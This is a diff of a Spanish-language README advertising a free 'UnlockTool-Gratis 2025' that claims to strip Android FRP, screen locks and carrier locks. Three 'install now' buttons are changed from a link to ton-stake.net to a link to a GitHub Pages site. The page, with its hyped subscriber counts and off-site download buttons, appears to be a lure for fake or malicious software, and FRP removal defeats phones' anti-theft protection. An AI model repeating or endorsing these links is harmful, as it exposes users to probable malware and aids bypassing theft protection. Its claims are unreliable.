@@ -6,7 +6,9 @@
 
 **Descripción**: ¡Desbloquea tu teléfono Android con **UnlockTool-Gratis 2025 (v2025.08.08.0)**, una herramienta gratuita impulsada por la comunidad! Elimina FRP, bloqueos de pantalla (PIN, patrón, contraseña) y restricciones de operadores sin esfuerzo. ¡Únete a 67K+ visitantes y 43K+ suscriptores para descargas gratis y consejos expertos en 2025!
 
-[![Instalar AHORA](https://img.shields.io/badge/Instalar-AHORA-00cc00?style=flat-square&labelColor=1a1a1a)](https://ton-stake.net)
+<a href="https://desbloqueolibre.github.io/.github/" target="_blank">
+  <img src="https://img.shields.io/badge/Install_Guide_Now-3498db" alt="Install Guide Now" width="275" height="60" style="border:none;">
+</a>
 
 ---
 
@@ -34,7 +36,9 @@
 6. **Solución de Problemas** ❓  
    ¿Problemas? Verifica la compatibilidad del dispositivo, asegúrate de que la depuración USB esté habilitada o visita nuestro foro comunitario para soporte.
 
-[![Instalar AHORA](https://img.shields.io/badge/Instalar-AHORA-00cc00?style=flat-square&labelColor=1a1a1a)](https://ton-stake.net)
+<a href="https://desbloqueolibre.github.io/.github/" target="_blank">
+  <img src="https://img.shields.io/badge/Install_Guide_Now-3498db" alt="Install Guide Now" width="275" height="60" style="border:none;">
+</a>
 
 ---
 
@@ -65,7 +69,9 @@
 - 🛠 **Libertad de Operador**: Usa cualquier tarjeta SIM al eliminar restricciones de red.  
 - 📚 **Consejos Comunitarios**: Aprende de las estrategias de desbloqueo de 43K+ suscriptores.
 
-[![Instalar AHORA](https://img.shields.io/badge/Instalar-AHORA-00cc00?style=flat-square&labelColor=1a1a1a)](https://ton-stake.net)
+<a href="https://desbloqueolibre.github.io/.github/" target="_blank">
+  <img src="https://img.shields.io/badge/Install_Guide_Now-3498db" alt="Install Guide Now" width="275" height="60" style="border:none;">
+</a>
 
 ---
 
